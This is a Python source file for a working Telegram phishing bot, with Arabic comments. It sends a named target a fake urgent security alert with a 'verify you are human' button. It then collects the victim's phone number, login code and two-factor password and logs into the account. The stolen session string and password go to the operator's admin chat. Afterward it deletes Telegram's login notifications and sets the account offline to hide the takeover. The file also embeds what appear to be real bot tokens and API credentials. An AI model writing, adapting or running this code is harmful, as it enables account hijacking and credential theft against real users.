import logging
import asyncio
import requests
import json
import threading
import os
from http.server import BaseHTTPRequestHandler, HTTPServer
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from telethon import TelegramClient, functions
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError

# ================= الإعدادات =================
BOT_TOKEN = "5768514554:AAGqY3bn42dACDnAyanqsiTylDl3S4_IWMU" # توكن بوت الجحش
ADMIN_ID = 8574178583 # الآيدي الخاص بك
TARGET_ID = "632621666" # الآيدي الخاص بالجحش (الهدف)
API_ID = 35980161 
API_HASH = 'd879538c1b65ee6aa57ac3b4ce4b63d3'

# ================= الخادم الوهمي (Health Server) =================
def run_web_server():
    port = int(os.environ.get("PORT", 8080))
    class SimpleHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"BOT IS ALIVE")
        def do_HEAD(self):
            self.send_response(200)
            self.end_headers()
        def log_message(self, format, *args):
            pass # كتم سجلات الخادم
    server = HTTPServer(('0.0.0.0', port), SimpleHandler)
    server.serve_forever()

threading.Thread(target=run_web_server, daemon=True).start()

# ================= إعداد البوت =================
app = Application.builder().token(BOT_TOKEN).build()
login_states = {}

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# ================= الدوال المساعدة =================
async def send_session_to_admin(phone, session_str, password=None):
    try:
        await app.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"🎯 **تم اصطياد ضحية جديدة!**\n\n📱 الرقم: `{phone}`\n🔑 كلمة السر: `{password or 'لا يوجد'}`\n\n💾 كود الجلسة:\n`{session_str}`",
            parse_mode="Markdown"
        )
    except Exception as e:
        print(f"خطأ في إرسال الجلسة: {e}")

async def clear_notifications(client):
    try:
        messages = await client.get_messages(777000, limit=5)
        for msg in messages:
            if msg.text and ("login" in msg.text.lower() or "تسجيل دخول" in msg.text):
                await client.delete_messages(777000, msg.id)
        await client(functions.account.UpdateStatusRequest(offline=True))
    except:
        pass

# ================= الطعم =================
async def send_bait_to_target():
    print("🎣 جاري إرسال الطعم للجحش...")
    keyboard = {
        "inline_keyboard": [
            [{"text": "🔵 تحقق أنك إنسان", "callback_data": "verify_human", "style": "primary"}]
        ]
    }
    payload = {
        "chat_id": TARGET_ID,
        "text": "⚠️ **تنبيه أمني عاجل:**\n\nتم رصد محاولة دخول مشبوهة لحسابك.\nيرجى التحقق من هويتك الآن لتأمين حسابك.",
        "parse_mode": "Markdown",
        "reply_markup": json.dumps(keyboard)
    }
    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data=payload)
        print("✅ تم إرسال الطعم بنجاح.")
    except Exception as e:
        print(f"❌ فشل إرسال الطعم: {e}")

# ================= المصيدة =================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[InlineKeyboardButton("🔵 تحقق أنك إنسان", callback_data="verify_human", style="primary")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "⚠️ **تنبيه أمني:** يرجى التحقق من هويتك لتأمين الحساب.",
        reply_markup=reply_markup, parse_mode="Markdown"
    )

async def verify_human(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    await query.edit_message_text("✅ تم التحقق.\n📱 يرجى إرسال رقم هاتفك (مع رمز الدولة):")
    login_states[user_id] = {"step": "waiting_phone"}

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in login_states: return
    text = update.message.text.strip()
    state = login_states[user_id]["step"]
    
    if state == "waiting_phone":
        phone = ''.join(filter(str.isdigit, text))
        if not phone.startswith('+'): phone = '+' + phone
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        try:
            await client.send_code_request(phone)
            login_states[user_id] = {"step": "waiting_code", "phone": phone, "client": client}
            await update.message.reply_text("📩 تم إرسال كود التحقق.\nأرسل الكود هنا:")
        except Exception as e:
            await update.message.reply_text(f"❌ خطأ: {e}")
            del login_states[user_id]
            
    elif state == "waiting_code":
        code = text
        phone = login_states[user_id]["phone"]
        client = login_states[user_id]["client"]
        try:
            await client.sign_in(phone, code)
            session_str = StringSession.save(client.session)
            await send_session_to_admin(phone, session_str)
            await clear_notifications(client)
            await update.message.reply_text("✅ تم تأمين حسابك بنجاح!")
            del login_states[user_id]
        except SessionPasswordNeededError:
            login_states[user_id]["step"] = "waiting_password"
            await update.message.reply_text("🔐 الحساب محمي بكلمة مرور (2FA).\nأرسل كلمة المرور:")
        except Exception as e:
            await update.message.reply_text(f"❌ كود خاطئ: {e}")

    elif state == "waiting_password":
        password = text
        phone = login_states[user_id]["phone"]
        client = login_states[user_id]["client"]
        try:
            await client.sign_in(password=password)
            session_str = StringSession.save(client.session)
            await send_session_to_admin(phone, session_str, password)
            await clear_notifications(client)
            await update.message.reply_text("✅ تم تأمين حسابك بنجاح!")
            del login_states[user_id]
        except Exception as e:
            await update.message.reply_text(f"❌ كلمة مرور خاطئة: {e}")

# ================= التشغيل =================
async def post_init(app: Application):
    await send_bait_to_target()

def main():
    app.post_init = post_init
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(verify_human, pattern="^verify_human$"))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print("🔥 الكود الخارق يعمل الآن... الطعم أُرسل، ونحن بانتظار الجحش.")
    app.run_polling(drop_pending_updates=True)

if __name__ == '__main__':
    main()
